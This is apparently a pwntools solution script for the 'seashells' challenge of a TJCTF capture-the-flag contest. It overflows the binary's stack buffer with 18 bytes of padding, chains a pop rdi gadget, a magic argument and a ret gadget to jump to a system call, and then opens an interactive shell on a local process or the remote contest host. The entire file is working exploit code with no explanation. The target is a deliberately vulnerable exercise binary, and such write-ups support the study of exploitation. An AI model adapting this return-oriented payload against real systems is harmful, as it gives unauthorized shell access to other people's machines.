from pwn import *



local = 1

if local:
	p = process('./seashells')
else:
	p = remote('p1.tjctf.org', 8009)



padding = "A" * 18

pop_rdi = p64(0x0000000000400803)
ret = p64(0x000000000040057e)

arg = p64(0xDEADCAFEBABEBEEF)
system = p64(0x4006C7)

payload = padding + pop_rdi + arg + ret + system

print(p.recvline())
print(p.recvline())

p.sendline(payload)

print(p.recvline())

p.interactive()

p.close()